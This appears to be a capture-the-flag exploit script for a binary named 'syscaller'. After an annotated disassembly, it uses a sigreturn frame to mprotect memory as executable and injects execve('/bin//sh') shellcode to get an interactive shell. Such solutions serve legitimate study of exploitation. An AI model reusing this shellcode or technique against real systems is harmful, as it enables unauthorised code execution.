#   4000e0:	55                   	push   rbp
#   4000e1:	48 89 e5             	mov    rbp,rsp
#   4000e4:	48 81 ec 00 02 00 00 	sub    rsp,0x200
#   4000eb:	bf 01 00 00 00       	mov    edi,0x1
#   4000f0:	48 be 30 01 40 00 00 	movabs rsi,0x400130
#   4000f7:	00 00 00 
#   4000fa:	ba 3e 00 00 00       	mov    edx,0x3e
#   4000ff:	b8 01 00 00 00       	mov    eax,0x1
#   400104:	0f 05                	syscall 
#
#   write(1,msg1,62)
#
#   400106:	b8 00 00 00 00       	mov    eax,0x0
#   40010b:	48 89 e6             	mov    rsi,rsp
#   40010e:	bf 00 00 00 00       	mov    edi,0x0
#   400113:	ba 00 02 00 00       	mov    edx,0x200
#   400118:	0f 05                	syscall 
# 
#   read(0,stack,0x200)
# 
#   40011a:	41 5c                	pop    r12
#   40011c:	41 5b                	pop    r11
#   40011e:	5f                   	pop    rdi
#   40011f:	58                   	pop    rax
#   400120:	5b                   	pop    rbx
#   400121:	5a                   	pop    rdx
#   400122:	5e                   	pop    rsi
#   400123:	5f                   	pop    rdi
#   400124:	0f 05                	syscall 
#
#
#
#   400126:	b8 3c 00 00 00       	mov    eax,0x3c
#   40012b:	48 31 ff             	xor    rdi,rdi
#   40012e:	0f 05                	syscall 
#
#   exit()

from pwn import *

p = process(["./syscaller"])

# context.log_level = 'debug'
context.arch = 'amd64'

payload = b'A'*8    # r12
payload += b'A'*8   # r11
payload += b'A'*8   # rdi
payload += p64(0xf) # rax
payload += b'A'*8   # rbx
payload += b'A'*8   # rdx
payload += b'A'*8   # rsi
payload += b'0'*8   # rdi

# 1st payload to call sigreturn

frame = SigreturnFrame()
frame.rip = 0x400104 # syscall then read
frame.rax = 0xa # mprotect
frame.rdi = 0x400000 # new allocation
frame.rsi = 0x1000 # allocation
frame.rdx = 0x7 # rwx
frame.rsp = 0x40011a # where to write shellcode, locate after syscall read

payload += bytes(frame)

p.sendline(payload)

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

# gdb.attach(p,gdbscript="""init-gef
# br *0x400118""")

p.sendline(shellcode)

p.interactive()